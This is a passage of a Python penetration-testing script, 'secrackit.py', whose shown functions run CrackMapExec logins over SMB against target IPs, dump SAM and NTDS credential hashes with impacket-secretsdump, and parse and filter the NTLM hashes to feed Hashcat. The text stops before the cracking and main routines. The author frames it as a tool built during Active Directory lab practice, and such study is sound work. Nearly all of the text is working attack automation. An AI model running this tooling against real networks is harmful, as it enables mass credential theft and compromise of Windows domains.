#!/bin/python3

###################### CREATED BY revsh3ll ########################
##################### PivotTheNet.github.io #######################
##################### github.com/PivotTheNet ######################
#          #        (#         #                                  #
#           #%#       %%#       ##(                               #
#             #&&%#    %%%#       %%%                             #
#    ,##/ *#%&&&&&&&&#  &&&&&.       &&%.                         #
#                 #&&&&&&&#%&&&&* #&   #&&&                       #
#       &&&&&&&&&&&&&&&&&&&&&&&&&&&&&  & #&&&. #  *               #
#     %            #&&&&&&&&&&&&&&&&&& &&/#&&&# &# ##             #
#         #&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%&%#&#            #
#      &&#     ,%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%&&&&&&            #
#          #&&&&&&&&&&&&&&&&&&&&( #&&&&&&&&&&&&&##%&&&            #
#       *&&#    &&&&&&&&&&&&&&    #&&&&&&&&&&&&&&&&#&#            #
#            &&%###&&&&&&&&&&/  #%         &&&&*#&&&&&( ,         #
#             #&&&&&&&&&&&&&&,           #&&&&&  #%&&&&# &        #
#            &&    #&&&&&&&&&#                #&&###&&&&&&        #
#           &     #&&&&&&&&&&&                  #&&&##&&&&        #
#                &&&&&&&&&&&&&&                  #&&&#&           #
#               %%.#%%&&&%&&&&&&#                 &&              #
#                  /%%%%%##%%%%%%%%%%#            #               #
#                   ## ###/ #### ####%%#                          #
#                     #   ##   ####  ######.                      #
##################### github.com/PivotTheNet ######################
##################### PivotTheNet.github.io #######################
###################### CREATED BY revsh3ll ########################

# secrackit.py

# What does secrackit.py do?
## secrackit.py automates the following into a single command:
## - Windows auth checks (CrackMapExec)
## - Dumps and parses secrets (Impacket-secretsdump)
## - Cracks NTLM hashes (Hashcat)


# Story behind the script?
## After some AD labs online and at home, I found myself running these three scripts over and over. I also wanted to organize dumped hashes by prepending IP, SAM or NTDS, etc to the NTLM hashes.

# Why so many comments? XD
## I'm learning and it helps when I come back to it later. Maybe it'll help others too. :)


# Example syntax: ./secrackit.py DC-IP domain.name IPs.txt accountname pw Password -localauth -out_dir ~/Desktop/toolsoutput -wordlist ~/Desktop/wordlists/customwordlist.txt -rule ~/media/hashcatrules/TwoRule.rule

## Arguments with a '-' (hyphen) are optional. Run `-h` for details.


# Script requirements?
## - Crackmapexec, impacket-secretsdump, and hashcat need to be in your $PATH.
## - If you aren't specifying a wordlist, `/usr/share/wordlists/rockyou.txt` needs to be present. 
## - If you're on Kali, you can extract rockyou.txt and then install the needed tools via apt.


# Shout-out to the makers of the tools "secrackit.py" simply automates:
## 1. CrackMapExec - https://github.com/byt3bl33d3r/CrackMapExec
## 2. Impacket-secretsdump - https://github.com/fortra/impacket
## 3. Hashcat - https://github.com/hashcat/hashcat

# DISCLAIMER at the end of code.




#######################
#### Imports below ####

import subprocess
import argparse
import ipaddress
import re
import sys
import os
from datetime import datetime

#### Imports above ####
#######################


######################
###Functions below ###

# Creates a folder, within the same directory as secrackit.py, with a naming scheme:
# "Month-Day-Year_Hour-Minute-Second"
def create_dir_for_dropping_that_output(user_input_dir_location):

	# Check for current date and time and assign to "now" var.
	now = datetime.now()

	# Assign "currenttime" var to a specific date/time format as this will be in the folder's name. 
	currenttime = now.strftime('%m-%d-%y_%H-%M-%S_secrackit')

	# Check if user input was provided via the -out_dir flag.
	# If argparse sees no -out_dir flag, it will have a value of "None".
	if user_input_dir_location == None:


		# Try except statement for error catching, so user isn't lost if script errors.
		try:

			# Find path secrackit.py is running from and save in var "currentdir" with appended "/" forward slash, as it's needed for os.mkdir() method to work.
			tempdir = os.path.dirname(os.path.realpath(__file__))
			currentdir = tempdir + '/'

			# Combine "currenttime" date/time var with "currentdir" var and create "createfolder" var, which will be the name of the folder created. 
			createfolder = (currentdir + currenttime)

			# Use os.mkdir method to create directory, where both tool and secrackit.py results will be saved.
			os.mkdir(createfolder)

			# Return full path of directory created, so we can place results into correct directory.
			return(createfolder + "/")

			# Catch error. Not sure what would preset this error, as there's other checks beforehand, but safe than sorry.

		except:

			sys.exit(user_input_dir_location + " is not allowing file creation... weird!")

	# If "user_input_dir_location" parameter is equal to 1, argparse has detected that the flag -out_dir is present BUT no argument was provided.
	elif user_input_dir_location == 1:
		sys.exit("\n\n\nYou forgot to enter a directory value for the -out_dir flag!\n\nHow the -out_dir flag works:\nA new (date/time) directory will be created within the directory specified by -out_dir flag.\nE.g. -out_dir ~/Desktop/attacks tells secrackit.py to make this (date/time) directory inside the \"attacks\" directory.\nThis (date/time) directory will contain the output from any successful attacks.\nBy default, secrackit.py creates this (date/time) directory within the same directory secrackit.py is launched from.")

	# Last scenario for parameter "user_input_dir_location" falls under this else block.
	# This represents user providing both the -out_dir flag and argument. E.g., "~/Desktop"
	# It works for either input including or excluding the appended "/" forward slash.
	# If user provides "/" in location, os.mkdir() will create directory as E.g., "~/Desktop//"
	else:

		# Try except statement to create or catch error.
		try:
			# Append "/" to user_input_dir_location.
			currentdir = user_input_dir_location + '/'

			# Combine "currenttime" date/time var with "currentdir" var and create "createfolder" var, which will be the name of the folder created.
			createfolder = (currentdir + currenttime)

			# Use os.mkdir method to create directory, where both tool and secrackit.py results will be saved.
			os.mkdir(createfolder)

			# Return full path of directory created, so we can place results into correct directory.
			return(createfolder + "/")

		# Catch error when directory user provided doesn't actually exist. Yes, you can use os.mkdirs(), not the "s", BUT I don't want the script making accidental directories.
		except:
			sys.exit("\n\n\nDirectory location: \"" + user_input_dir_location + "\" does not exist!\nCreate the directory and retry.\n\nHow the -out_dir flag works:\nA new (date/time) directory will be created within the directory specified by -out_dir flag.\nE.g. -out_dir ~/Desktop/attacks tells secrackit.py to make this (date/time) directory inside the \"attacks\" directory.\nThis (date/time) directory will contain the output from any successful attacks.\nBy default, secrackit.py creates this (date/time) directory within the same directory secrackit.py is launched from.")




# Check if "user_input_wordlist_loc" aka "-wordlist" is set or not, then check for valid file location.
def validate_wordlist_input(user_input_wordlist_loc):

	# Check to see if optional argument is present
	if user_input_wordlist_loc == None:

		try:

			# Set new var "default_user_input_wordlist_loc" to default Kali rockyou location.
			default_user_input_wordlist_loc = ("/usr/share/wordlists/rockyou.txt")

			# Return new var "default_user_input_wordlist_loc" value back to function call.
			return(default_user_input_wordlist_loc)

		# On error... which shouldn't happen...
		except:

			sys.exit("Error setting wordlist location to default \"/usr/share/wordlists/rockyou.txt\".. weird...")

	# else if "user_input_wordlist_loc" argument is present but NO value set, prompt user.
	elif user_input_wordlist_loc == 1:

		sys.exit("\n\"-wordlist\" argument present but no wordlist location followed.\n\nIf you want to use a custom wordlist for Hashcat, please enter wordlist location after the \"-wordlist\" argument,\nelse remove \"-wordlist\" and make sure the file \"/usr/share/wordlists/rockyou.txt\" is present!\n\nNo scripts ran, no folders created!")


	else:
		
		# Does the "user_input_wordlist_loc" exist as a file?
		is_wordlist_file = os.path.isfile(user_input_wordlist_loc)

		# If "is_wordlist_file" is true(present), run code block.
		if is_wordlist_file:

			# Assign var "custom_wordlist_present" to user input and return value.
			custom_wordlist_present = user_input_wordlist_loc

			# return "custom_wordlist_present"
			return(custom_wordlist_present)

		else:

			# Throw error to user stating file does not exist...
			sys.exit("\nWrong wordlist location entered? Does wordlist exists?: " + user_input_wordlist_loc + "\n\nPlease verify location syntax of the wordlist file and make sure the wordlist file does indeed exist,\nelse remove the \"-wordlist\" argument to run the default \"/usr/share/wordlists/rockyou.txt\" wordlist with Hashcat.\n\n\nNo scripts ran, no folders created!")




# Validate if "-rule" argument is present. If so, validate file loc. Else run without a rule.
# If -rule is missing(value = None), I'll use that to determine which hashcat function to run.
def validate_rule_input(user_input_rule_loc):

	# if "-rule" argument is absent(value = None), return None value to use later at run_hashcat functions.
	if user_input_rule_loc == None:

		# Return None value
		return(user_input_rule_loc)


	# If "-rule" is present but no value follows(value = 1), throw error.
	elif user_input_rule_loc == 1:

		sys.exit("\n\"-rule\" argument present but no rule location followed.\n\nIf you want to use a custom rule with Hashcat, please enter rule location after the \"-rule\" argument,\nelse remove \"-rule\", so Hashcat can run without.\n\nNo scripts ran, no folders created!")


	else:

		# Check if rule file does exists.
		is_rule_loc = os.path.isfile(user_input_rule_loc)

		# If "is_rule_loc" is true(present), run code block.
		if  is_rule_loc:

			# Assign custom rule argument value to "customer_rule_present" var and return it.
			custom_rule_present = user_input_rule_loc

			# return "custom_rule_present"
			return(custom_rule_present)

		else:

			# Throw error to user stating the location of the "-rule" argument is not present
			sys.exit("\nWrong rule location entered? Does rule exists?: " + user_input_rule_loc + "\n\nPlease verify location syntax of the rule file and make sure the rule file does indeed exist,\nelse remove \"-rule\" argument to run no rule with Hashcat.\n\n\nNo scripts ran, no folders created!")


	return(user_input_rule_loc)




# Converts the required argparse option, "pw" or "ntlm", to either -p or -H respectively.
# This conversion is needed as CME will need either "-p" for password or "-H" for hash.
def convert_pw_or_hash_flag(needs_converted_pw_hash_flag):

	# If code block for converting "pw" to "-p".
	if needs_converted_pw_hash_flag == "pw":
		
		# "converted_pw" var holds the string replacement.
		converted_pw = needs_converted_pw_hash_flag.replace("pw", "-p")

		# Return "converted_pw" for CME function later.
		return(converted_pw)

	# elif code block for converting "ntlm" to "-H".
	elif needs_converted_pw_hash_flag == "ntlm":

		# "converted_hash" car hold the string replacement".
		converted_hash = needs_converted_pw_hash_flag.replace("ntlm", "-H")

		# Retuen "converted_hash" for CME function later.
		return(converted_hash)

	# else code block for handling any input errors.
	else:

		# This error should not happen as argparse should catch a missing required argument.
		sys.exit("Failure happened in 'convert_pw_or_hash_flag' function.")




# Validates if the provided IP or CIDR address, either entered at terminal or provided in a file, is/are correctly formatted.
# E.g., 192.168.1.1 or 10.10.10.0/24
# If a file containing IPs or CIDR formats was inputted, check IP or CIDR for typos and report error.
# Also make sure the file presented actually exists.
def validate_target_ips(user_input_target_ips):

	# Does the "user_input_target_ips" exist as a file?
	is_input_file = os.path.isfile(user_input_target_ips)

	# If "is_input_file" is true(present), run code block.
	if is_input_file:

		# Open "user_input_target_ips" file in read mode.
		file_of_IPs = open(user_input_target_ips, 'r')

		# For each IP in "user_input_target_ips", loop...
		for IP in file_of_IPs:

			# Strip each line and try...
			IP = IP.strip()
			try:

				# Check each line for a IP network aka 192.168.1.0/24 format.
				ipaddress.ip_network(IP)

				# If not an network ID, except, try...

			except:

				try:

					# Check each line for an IP address aka 192.168.1.1 format.			
					ipaddress.ip_address(IP)

				except:

					# If either network or address fail, sys.exit with message.
					sys.exit("\nInvalid IP format: " + IP + "\nFound within file: " + user_input_target_ips + "\n\nMake sure each IP and/or CIDR are formatted line by line.\n\nExample:\n192.168.1.1\n192.168.1.10\n10.10.10.0/24\n")

		return(user_input_target_ips)

	# If input is not a file, check user input for correct IP address or CIDR format.

	else:

		try:

			# Check "user_input_target_ips" for IP network format. If true, return "user_input_target_ips".
			ipaddress.ip_network(user_input_target_ips)
			return(user_input_target_ips)

		# If not a network ID format, check for IP address format.
		except:

			try:

				# Check "user_input_target_ips" for IP address format. If true, return "user_input_target_ips".
				ipaddress.ip_network(user_input_target_ips)
				return(user_input_target_ips)

			# If "user_input_target_ips" is neither, throw sys.exit() with message.
			except:

				sys.exit("\nInvalid IP/CIDR format or file location: " + user_input_target_ips + "\n\nValid IP inputs:\nSingle IP - 192.168.1.1\nCIDR - 192.168.1.0/24\nFile - containing target IP addresses or CIDR.\n\nIf you'd like to attack many different hosts, input a file holding IPs or CIDRs, formatted line by line!\n\nExample:\n192.168.1.1\n192.168.1.10\n10.10.10.0/24\n")
				



# If "ntlm" argument inputted, verify if NTLM hash is indeed NLTM format.
# If "pw" inputted, verify if password is indeed a password and NOT a NTLM hash. 
def was_valid_hash_or_password_provided(user_input_password_or_ntlm_value, converted_pw_hash_flag):
	
	# Define special characters that don't exist in NTLM hashes.
	special_chars = set("[@_!#$%^&*()<>?/\|}{~]")

	# Check if hash is either a password, incorrect format, or is indeed a NTLM hash format.
	if converted_pw_hash_flag == "-H":

		# If 65 in length, character position 32 is ':' and no special characters are found, confirmed NTLM hash. Return value.
		if len(user_input_password_or_ntlm_value) == 65 and user_input_password_or_ntlm_value.index(":") == 32 and not special_chars.intersection(user_input_password_or_ntlm_value) == None:
			confirmed_ntlm_hash_format = user_input_password_or_ntlm_value
			return (confirmed_ntlm_hash_format) 

		# If 32 in length and no special characters are found, either a LM or NT hash found. Chances of this being a password are slim. Throw error with message.
		elif len(user_input_password_or_ntlm_value) == 32 and not special_chars.intersection(user_input_password_or_ntlm_value) == None:
				sys.exit("\nWrong hash format!\n\nIf flag was meant for 'ntlm', please enter NTLM hash in the following LM:NT format:\n'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'\n\nNo network tools ran!\nIf this was indeed a 32 character password with no special characters, let me know. I'll work on a fix!")

		else:

			# Was a password entered when the 'ntlm' flag was set? Prompt user with direction.
			sys.exit("\nDid you mean to enter a password or NTLM hash? \nCheck password/NTLM value entered AND if 'ntlm' flag was meant for 'pw'!\n\nRemember to enter NTLM hash in the following LM:NT format:\n'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'\n\nNo network tools ran!")

	# Verify if password is actually a hash and prompt user as needed.
	elif converted_pw_hash_flag == "-p":

		# If NTLM hash, prompt user to check 'pw' flag and review. Wrong flag set?
		if len(user_input_password_or_ntlm_value) == 65 and user_input_password_or_ntlm_value.index(":") == 32 and not special_chars.intersection(user_input_password_or_ntlm_value) == None:
			sys.exit("\nPossible NTLM hash entered with \"pw\" flag set.\nCheck password/NTLM hash value entered OR if the \"pw\" flag was meant for \"ntlm\"!\n\nNo network tools ran!")
		

		elif len(user_input_password_or_ntlm_value) == 32 and not set(":").intersection(user_input_password_or_ntlm_value) == ":":
			sys.exit("\nFlag 'pw' is set for password and password/hash value is 32 characters in length with no special characters?\nCheck password/hash value entered OR if the 'pw' flag was meant for 'ntlm'!\n\nNo network tools ran!")

		else:

			# If not looking like a hash and flag pw was set, return value and continue script.
			confirmed_password_format = user_input_password_or_ntlm_value
			return(confirmed_password_format)

	else:

		# This error shouldn't happen as argparse should catch no value when the "Pass_or_NTLM_val" is required input.
		len(user_input_password_or_ntlm_value) == 0
		sys.exit("\nNo value was entered into the password/hash field.. How did you end up here?\n\nNo network tools ran!")




# Run CME against LOCAL AUTH only. Domain auth found in it's own function below this one!
# Returns string as raw, ANSI riddled output.

# CME takes in target(s) IP/CIDR, converted pw-ntlm flag, Pass_or_NTLM_val, along with the username and -localauth flag.
def run_crackmapexec_against_local(user_input_target_ips, user_input_username, converted_pw_hash_flag, validated_NTLM_hash_or_password, user_input_local_flag):

	# If argparse "user_input_local_flag" value equal to True...
	if user_input_local_flag == True:

		# Create var "local_flag", which will be inputted into CME to run LOCAL auth.
		local_flag = "--local-auth"

		# Create var "local" to insert into the user terminal feedback.
		local = "Local"

		# Terminal feed showing the overall options being ran.
		# If IP argument is a file, only the file name is presented.
		print("\nRunning CrackMapExec with the following options:\n  Local or Domain Auth? = " + local + "\n  Target IP, CIDR, or File = " + user_input_target_ips + "\n  Username = " + user_input_username + "\n  NTLM or Password = " + validated_NTLM_hash_or_password + "\n")
	else:
		# This error shouldn't happen in normal OP.
		sys.exit("--local-auth not set but running under local authentication?")

	# Var "crackmapexec_cmd" which holds the subprocess.run function output.
	# Passing the needed arguments into CME. Specifying "local_flag" for local auth only.
	crackmapexec_cmd = subprocess.run(["crackmapexec", "smb", user_input_target_ips, "-u", user_input_username, converted_pw_hash_flag, validated_NTLM_hash_or_password, local_flag], capture_output=True)

	# To convert the byte output to string.
	crackmapexec_cmd_to_str = crackmapexec_cmd.stdout.decode()

	# Providing further feedback to user, updating on what possibly auth there was.
	# Looks for "[+]" and "Pwn3d" in output.
	# [+] represents successful authentication but not necessarily administrative access.

	# "Pwn3d" means both successful authentication and administrative access.
	if (("[+]" in crackmapexec_cmd_to_str and "Pwn3d" in crackmapexec_cmd_to_str)):
		print("\nLOCAL authentication and administrative access found!\n")

		return(crackmapexec_cmd_to_str)

	# If account authenticates but doesn't have administrative rights...
	# Always worth running either way... may be bad CME feedback. I've heard it's happened from others.
	elif ("[+]" in crackmapexec_cmd_to_str):
		print("\nLOCAL authentication found. Administrative access unknown!\nSuccessful secretsdump NOT GUARANTEED but worth checking... attempting secretsdump!\n")

		return(crackmapexec_cmd_to_str)

	# Unsure this situation can happen but why not define it...
	elif ("Pwn3d" in crackmapexec_cmd_to_str):
		print("\nConfirmed LOCAL administrative access but LOCAL authentication unconfirmed!\n")

		return(crackmapexec_cmd_to_str)

	else:
		# If authentication failed all together, this message is thrown.
		sys.exit("\nLOCAL authentication failed against ALL targets...\nPlease try again with new credentials, targets, and/or DOMAIN level authentication(remove -localauth flag).")	




# Function to run CME against DOMAIN AUTHENTICATION only. Local auth found in it's own function above!
# Returns string of raw, ANSI riddled output.

# CME takes in validated Target IPs, converted pw-ntlm flag, NTLM or Password, along with user input domain. Local flag passed for debugging.
def run_crackmapexec_against_domain(user_input_target_ips, user_input_domain, user_input_username, converted_pw_hash_flag, validated_NTLM_hash_or_password, user_input_local_flag):

	# Terminal feed showing the overall options being ran.
	# If IP argument is a file, only the file name is presented.
	if user_input_local_flag == False:
		domain = "Domain"
		print("\nRunning CrackMapExec with the following options:\n  Local or Domain Auth? = " + domain + "\n  Target IP, CIDR, or File = " + user_input_target_ips + "\n  Username = " + user_input_username + "\n  NTLM or Password = " + validated_NTLM_hash_or_password + "\n")
	else:
		# Error for debugging purposes. Shouldn't flag during normal OP.
		sys.exit("--local-auth set but running under domain authentication?")

	# Var "crackmapexec_cmd" which holds the subprocess.run function output.
	# Passing the needed arguments into CME. Specifying "-d" for domain auth.
	crackmapexec_cmd = subprocess.run(["crackmapexec", "smb", user_input_target_ips, "-d", user_input_domain,"-u", user_input_username, converted_pw_hash_flag, validated_NTLM_hash_or_password], capture_output=True)

	# To convert the byte output to string.
	crackmapexec_cmd_to_str = crackmapexec_cmd.stdout.decode()


	# Providing further feedback to user, updating on what possibly authentications there were.
	# Providing further feedback to user, updating on what possibly auth there was.
	# Looks for "[+]" and "Pwn3d" in output.
	# "Pwn3d" mean both successful authentication and administrative privs.
	if (("[+]" in crackmapexec_cmd_to_str and "Pwn3d" in crackmapexec_cmd_to_str)):
		print("\nDOMAIN authentication and administrative access found!\n")

		return(crackmapexec_cmd_to_str)

	# If account authenticates but doesn't have administrative rights...
	# Always worth running either way... may be bad CME feedback. I've heard it's happened from others.
	elif ("[+]" in crackmapexec_cmd_to_str):
		print("\nDOMAIN authentication found. Administrative access unknown!\nSuccessful secretsdump NOT GUARANTEED but worth checking... attempting secretsdump!\n")

		return(crackmapexec_cmd_to_str)

	# Unsure this situation can happen but why not define it...
	elif ("Pwn3d" in crackmapexec_cmd_to_str):
		print("Confirmed DOMAIN administrative access but LOCAL authentication unconfirmed!\n")

		return(crackmapexec_cmd_to_str)

	else:
		# If authentication failed all together, this message is thrown.
		sys.exit("\nDOMAIN authentication failed against ALL targets...\nPlease try again with new credentials, targets, and/or LOCAL level authentication(add -localauth flag).")



# Remove ANSI escape from the CME output...
def remove_ansi_escape(run_crackmapexec_function_output):

	# Var "ansi_escape_chars" is regex compile of all ANSI characters to remove.
	ansi_escape_chars = re.compile(r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]')

	# "no_ansi_cme" var stores output. re.sub is ran on "run_crackmapexec_function_output".
	no_ansi_cme = ansi_escape_chars.sub('', run_crackmapexec_function_output)

	# Return clean "no_ansi_cme".
	return(no_ansi_cme)



# Create CME data file where CME raw output will be exported to.
def cme_data_file(directory_location, NetworkID_for_files):

	# var "cme_data_location" contained directory location plus string and networkID
	cme_data_location = directory_location + "cme_data_" + str(NetworkID_for_files) + ".txt"

	# Return cmd_data_location, so it can be called upon later on.
	return(cme_data_location)



# Exports ANSI free CME output to a file.
# File located where user specified or in default location(aka where secrackit.py ran from). 
def export_CME_to_file(removed_ansi_CME_output, cmd_data_file_location):

	# Open new file with append permission.
	export_CME_data = open(cmd_data_file_location, "a")

	# Write "removed_ansi_CME_output" to opened file.
	export_CME_data.write(removed_ansi_CME_output)

	# Close file, so it's no longer in use.
	export_CME_data.close()



# Take in CME string output and remove unwanted characters from string.
# Providing a simple string to parse into a list later. 
def parse_crackmapexec_results_string(removed_ansi_CME_output):

	# Removed whitespace from the string, so it's easier to parse!
	removed_whitespace = str.lstrip(str.rstrip(re.sub(' +',' ',removed_ansi_CME_output)))

	# Remove port 445
	port_removed = re.sub('445 ', '', removed_whitespace)

	# Remove SMB protocol
	smb_removed = re.sub('SMB ', '', port_removed)

	# Removed [+] from string
	plus_sign_removed = re.sub(' \[\+\]', '', smb_removed)

	# Return results.
	parsed_string_to_return = plus_sign_removed
	return(parsed_string_to_return)



# Move parsed CME results over to a list, sort it, so we can organize results per target.
def convert_parsed_CME_to_list(parsed_CME_string):

	# Split the terminal string output into a new list at the \n regex.
	new_lines_parsed = parsed_CME_string.split('\n')

	# Remove empty(if any) elements from list.
	removed_empty_elements = [i for i in new_lines_parsed if i]

	# Remove the initial lines from the list containing the "[*]" characters.
	# These are informational and aren't needed for our script.
	removed_unwanted_elements = [x for x in removed_empty_elements if "[*]" not in x]

	# Remove failed authentication attempts by removing items containing "[-]" characters.
	removed_failed_auth = [x for x in removed_unwanted_elements if "[-]" not in x]

	# Sort results in some sequential order...
	removed_failed_auth.sort()

	# Provide user terminal feedback of how many targets will be attacked with secretsdump.
	# This includes BOTH confirmed admin access and anything that authenticates.
	# Reason to include non-admin authenticated is that I've heard others have successful secretsdump even when CME doesn't show the access as "Pwn3d"... So I'm playing it safe...
	number_of_admin_auth = sum('Pwn3d' in s for s in removed_failed_auth)
	number_of_targets = str(len(removed_failed_auth))
	print(str(number_of_admin_auth) + " of " + str(number_of_targets) + " targets provide administrative access!\n")

	# This prints the cleaned, simply CME results on terminal for user.
	print("CME Results:")
	for i in range(0, len(removed_failed_auth)):
		print(removed_failed_auth[i])

	# Return simple, cleaned CME results.
	clean_CME_results = removed_failed_auth
	return(clean_CME_results)



# Create and return list of IPs, from CME results.
# This list will feed into a secretsdump's loop.
def create_IP_list(CME_string_to_list):

	# Create regex pattern for pulling out 
	IP_pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')

	# Create empty list to feed found IPs into.
	IP_list = []

	# For each in list, append to IP_list.
	for asset in CME_string_to_list:
		IP_list.append(IP_pattern.search(asset)[0])

	# Return new IP_list.
	return(IP_list)



def make_networkID(IP_list_for_secretsdump):

	# Assign first IP in "IP_list_for_secretsdump" list to var "IP_address".
	IP_address = IP_list_for_secretsdump[0]

	# "IP_pattern" represents the NetworkID of (possibly) common IP addresses attacked.
	IP_pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3})')

	# "NetworkID" holds the output of re.search, which looks for pattern against index[0].
	network_ID = re.search(IP_pattern, IP_address)

	# "IP_to_file" holds NetworkID pulled from group(0) of re.search outcome.
	IP_to_file = (network_ID.group(0))

	# Return results
	return(IP_to_file)


# Runs impacket_secretsdump against specified "target_ip" called upon.
# Returned results are combined with extra strings, to help separate results per IP.
def run_impacket_secretsdump(user_input_domain, user_input_username,validated_NTLM_hash_or_password, IP_list_for_secretsdump):

	# "secretsdump_subprocess" var holds secretsdump results.
	secretsdump_subprocess = subprocess.run(["impacket-secretsdump", user_input_domain + '/' + user_input_username + ':' + validated_NTLM_hash_or_password + '@' + str(IP_list_for_secretsdump)], capture_output=True)

	# Convert byte code to string.
	secretsdump_output_to_str = secretsdump_subprocess.stdout.decode()

	# Prepend and append some designations to result, so parsing/browsing is easier.
	prepend_IP_to_results = ("=== Beginning of results for " + str(IP_list_for_secretsdump) + " ===\n" + secretsdump_output_to_str + "=== Ending of results for " + str(IP_list_for_secretsdump) + " ===\n")

	# Return results.
	return(prepend_IP_to_results)



# Secretsdump raw file location with NetworkID naming scheme.
def secretsdump_raw_file(NetworkID_for_files, directory_location):

	# var for holding location of secretsdump raw file
	secretsdump_raw_file = directory_location + "secretsdump_data_" + str(NetworkID_for_files) + ".txt"

	# Return result
	return(secretsdump_raw_file)



# Export raw var "secretsdump_raw_list" to new file in created folder.
def export_secretsdump_raw_list(secretsdump_raw_list, secretsdump_raw_file_location):

	# Open new file with write permission with naming convention.
	export_secretsdump_data = open(secretsdump_raw_file_location, "a")

	# For each dump write to file with separating "#" symbols.
	for dump in range(0, len(secretsdump_raw_list)):
	
		# Write "secretsdump_raw_list" to opened file.
		export_secretsdump_data.write(secretsdump_raw_list[dump] + "\n\n" + "#######################################################\n\n\n")

	# Close file, so it's no longer in use.
	export_secretsdump_data.close()



# Parse SAM section from secretsdump results and prepend "SAM-" before each.
def remove_SAM_section(secretsdump_raw_list):

	# For each string, check if it contains the variable's string.
	SAM_string_check = "Dumping local SAM hashes"

	# If the string is found in "secretsdump_raw_list", extract and assign to list then append SAM- to each item.
	if SAM_string_check in secretsdump_raw_list:

		# Create empty list called results.
		results = ""

		# Strings used with index to find characters found between each.
		string1 = "\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)"
		string2 = "\n[*] Dumping cached domain"

		# Create two variables storing the index location of each found string.
		index1 = secretsdump_raw_list.index(string1)
		index2 = secretsdump_raw_list.index(string2)

		# For each item in list...
		# Add string chars between index1 plus the length of index to index 2.
		for index in range(index1 + len(string2) + 1, index2):
			results = results + secretsdump_raw_list[index]

		# Remove any "\n" with "\nSAM-", to designate where indexed from.
		added_SAM = results.replace("\n", "\nSAM-")

		# Return result, which will then be added to SAM only list of lists.
		return(added_SAM)

		# Else if nothing is found...
	else:

		# Pass and move onto next item in list. If no pass, it'll error.
		pass


# Parse NTDS section from secretsdump results and prepend "NTDS-" before each.
def remove_NTDS_section(secretsdump_raw_list):

	NTDS_string_check = "NTDS.DIT secrets"
	
	# If string is found in "secretsdump_raw_list", extract and assign to list then append NTDS- to each item.
	if NTDS_string_check in secretsdump_raw_list:

		# Create empty list called results.
		results = ""

		# Strings used with index to find characters found between each.
		string1 = "Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n"
		string2 = "\n[*] Kerberos"

		# Create two variables storing the index location of each found string.
		index1 = secretsdump_raw_list.index(string1)
		index2 = secretsdump_raw_list.index(string2)

		# For each item in list...
		# Add string chars between index1 plus the length of index to index 2.
		for index in range(index1 + len(string2) + 1, index2):
				results = results + secretsdump_raw_list[index]

		# Remove any "\n" with "\nNTDS-", to designate where indexed from.
		added_NTDS = results.replace("\n", "\nNTDS-")

		# Return result, which will then be added to NTDS only list of lists.
		return(added_NTDS)

		# Else if nothing is found...
	else:

		# Pass and move onto next item in list.
		pass



# Zip both SAM and NTDS list of lists via row-wise.
def combine_convert_SAM_and_NTDS_results(SAM_section_parsed, NTDS_section_parsed):
	
	# variable holding list of zipped list of lists, creating a list of tuples.
	combined_SAM_NTDS_tuple = list(zip(SAM_section_parsed, NTDS_section_parsed))

	# As I want to change these lists still, I convert to list of strings.
	SAM_NTDS_list_of_strings = [str(element) for element in combined_SAM_NTDS_tuple]

	# Return list of strings.
	return(SAM_NTDS_list_of_strings)



# Parses "secretsdump_raw_list" for IPs, so returned value reflects order of results.
# May be unnecessary but doing this step anyways.
def parse_IP_from_secrets(secretsdump_raw_list):

	# regex which matches IP addresses
	IP_pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')

	# var "search_IP" holds results of of re.search
	search_IP = re.search(IP_pattern, secretsdump_raw_list)

	# extract group 0 which contains the IP from search
	current_IP = (search_IP.group(0))

	# return value
	return(current_IP)	



# Extracts NTLM hashes and formats them to be hashcat friendly.
# From my testing, hashcat only likes one semi-colon in a hash input.
# So I replace the first two occurrences of ":"(semicolon) with a "-"(dash).
# Goal is... Hashcat will ingest IP-{SAM, NTDS}-{domain.name}\\username-RID:LThash:NThash with module 1000(-m 1000).
def parsed_secretsdump_list(combined_SAM_NTDS_results):

	# regex pattern re compiles - {SAM NTDS}-{domain.name\\}ACCOUNT-RID-LT:NT
	NTLM_pattern = re.compile(r'([A-Z]*[-][A-Za-z0-9\\\^\$\.\|\?\*\+\(\)\{\}]*[A-Za-z0-9\$\-]*[:][0-9]*[:][a-z0-9A-Z]{32}[:][a-zA-Z0-9]{32})')

	# re.findall is used to find all instances of a NTLM pattern in the output.
	parsed_hashes = re.findall(NTLM_pattern, combined_SAM_NTDS_results)

	# Found NTLM hashes moved into a list then map is ran in each item to replace the first two semi-colons (":") with a hyphen ("-").
	parsed_hashes = list(map(lambda s: s.replace(":", "-", 2), parsed_hashes))

	# Return results.
	return(parsed_hashes)



# Removes WDAG and disabled accounts from parsed dumps.
def remove_default_hashes(ordered_per_IP_hash_list):

	# NTLM hash representing disabled account on a Windows host.
	disabled_account_hash = "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"

	# List comprehension with nested comprehension as the items we're accessing are in a list of a list.
	# Substring expression simply does a copy with a for loop if NTLM doesn't equal "disabled_account_hash".
	clean_results_of_dead_hashes = [[substring for substring in sublist if disabled_account_hash not in substring] for sublist in ordered_per_IP_hash_list]

	# Same as before but with the removal of WDAG account.(Defender account for edge isolation.)
	WGAGUtility = "WDAGUtilityAccount"

	# Copy all BUT WDAG accounts over into new list of list.
	clean_results_of_WDAG_hash = [[substring for substring in sublist if WGAGUtility not in substring] for sublist in clean_results_of_dead_hashes]

	# Return WDAG & disabled hashes in list of list.
	return(clean_results_of_WDAG_hash)



# Remove computer accounts from SAM dumps.
def remove_computer_hashes(removed_default_hashes):
	
	# string to search for.
	computer_hashes = "$-"

	# for each item in list of list, create new list of list which includes all BUT computer accounts.
	clean_results_of_computer_hashes = [[substring for substring in sublist if computer_hashes not in substring] for sublist in removed_default_hashes]

	# Return results
	return(clean_results_of_computer_hashes)



